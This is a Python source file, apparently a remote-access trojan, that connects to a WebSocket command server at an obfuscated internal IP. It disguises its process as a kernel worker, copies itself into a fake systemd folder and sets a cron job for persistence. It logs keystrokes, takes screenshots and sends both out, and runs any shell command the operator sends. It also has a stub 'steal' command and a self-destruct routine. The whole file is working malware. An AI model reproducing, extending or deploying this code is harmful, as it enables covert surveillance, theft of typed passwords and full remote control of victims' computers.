import asyncio
import websockets
import os
import subprocess
import uuid
import base64
import sys
import shutil
import glob
from io import BytesIO

try: import setproctitle
except: setproctitle = None
try: from PIL import ImageGrab
except: ImageGrab = None
try: from pynput import keyboard
except: keyboard = None

_S = "d3M6Ly8xOTIuMTY4LjEwLjgyOjgwMDAvd3Mv" 
X_KEY = "AMY_2026_SECRET"
FAKE_NAME = "[kworker/u2:1-events]"

log_buffer = []
current_dir = os.getcwd()

def get_url(): return base64.b64decode(_S).decode()

def crypt_logic(d):
    k = X_KEY
    return "".join(chr(ord(d[i]) ^ ord(k[i % len(k)])) for i in range(len(d)))

def decrypt(m):
    try: return crypt_logic(base64.b64decode(m).decode())
    except: return None

def encrypt(m): return base64.b64encode(crypt_logic(m).encode()).decode()

def masquerade():
    if setproctitle: setproctitle.setproctitle(FAKE_NAME)
    else:
        try:
            import ctypes
            libc = ctypes.CDLL('libc.so.6')
            libc.prctl(15, FAKE_NAME.encode(), 0, 0, 0)
        except: pass

def ghost_install():
    try:
        target_dir = os.path.expanduser("~/.local/share/systemd-service")
        target_path = os.path.join(target_dir, "sys-update")
        current_path = os.path.abspath(sys.argv[0])
        if current_path != target_path:
            os.makedirs(target_dir, exist_ok=True)
            shutil.copy2(current_path, target_path)
            os.chmod(target_path, 0o755)
            cron_cmd = f"*/2 * * * * {target_path} > /dev/null 2>&1"
            current_cron = subprocess.run("crontab -l", shell=True, capture_output=True, text=True).stdout
            if target_path not in current_cron:
                new_cron = current_cron.strip() + f"\n{cron_cmd}\n"
                subprocess.Popen("crontab -", stdin=subprocess.PIPE, shell=True).communicate(input=new_cron.encode())
            subprocess.Popen([target_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            sys.exit(0)
    except: pass

async def keylog_sender(ws):
    global log_buffer
    while True:
        try:
            await asyncio.sleep(20) # Зменшив інтервал для тесту
            if log_buffer:
                data = "".join(log_buffer)
                await ws.send(encrypt(f"AUTO_KEYLOG:{data}"))
                log_buffer = []
        except: break

def on_press(key):
    global log_buffer
    try:
        k = key.char
    except AttributeError:
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "[ENTER]\n",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.tab: "[TAB]"
        }
        k = special_keys.get(key, "")
    if k: log_buffer.append(k)

def take_screenshot_sync():
    """Синхронна функція для потоку"""
    if ImageGrab:
        try:
            img = ImageGrab.grab()
            buf = BytesIO()
            img.save(buf, format="PNG")
            return base64.b64encode(buf.getvalue()).decode()
        except: return None
    return None

async def run_shell(command):
    global current_dir
    try:
        command = command.strip()
        if command.startswith("cd "):
            path = command[3:].strip()
            new_path = os.path.abspath(os.path.join(current_dir, path))
            if os.path.isdir(new_path):
                current_dir = new_path
                os.chdir(current_dir)
                return f"Changed directory to: {current_dir}"
            return f"Error: {path} is not a directory"

        os.chdir(current_dir)
        process = await asyncio.create_subprocess_shell(
            command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, cwd=current_dir
        )
        stdout, stderr = await process.communicate()
        output = stdout.decode().strip() or stderr.decode().strip()
        prompt = f"\n[AMY-SHELL] {os.getlogin()}:{os.getcwd()}$ "
        return (output or "Success.") + prompt
    except Exception as e:
        return f"Shell Error: {str(e)}"

async def start():
    masquerade()
    ghost_install()
    if keyboard:
        try: keyboard.Listener(on_press=on_press).start()
        except: pass
    
    b_id = f"bot_{hex(uuid.getnode())[2:10]}"
    
    while True:
        try:
            async with websockets.connect(get_url() + b_id, ping_interval=None) as ws:
                asyncio.create_task(keylog_sender(ws))
                while True:
                    m = await ws.recv()
                    cmd = decrypt(m)
                    if not cmd: continue
                    cmd = cmd.strip()
                    
                    if cmd == "screenshot":
                        # ВИКОНУЄМО В ОКРЕМІЙ НИТЦІ, щоб не "вбити" WebSocket
                        shot_b64 = await asyncio.to_thread(take_screenshot_sync)
                        if shot_b64:
                            await ws.send(encrypt(f"SCREENSHOT:{shot_b64}"))
                        else:
                            await ws.send(encrypt("SYS_MSG: Screenshot failed"))
                            
                    elif cmd == "steal":
                        await ws.send(encrypt("SYS_MSG: Stealer initiated..."))
                        # Тут твоя логіка стілера
                        await ws.send(encrypt("SYS_MSG: Stealer finished."))
                        
                    elif cmd == "self_destruct":
                        subprocess.run("crontab -r", shell=True)
                        os._exit(0)
                    else:
                        response = await run_shell(cmd)
                        await ws.send(encrypt(response))
        except:
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(start())

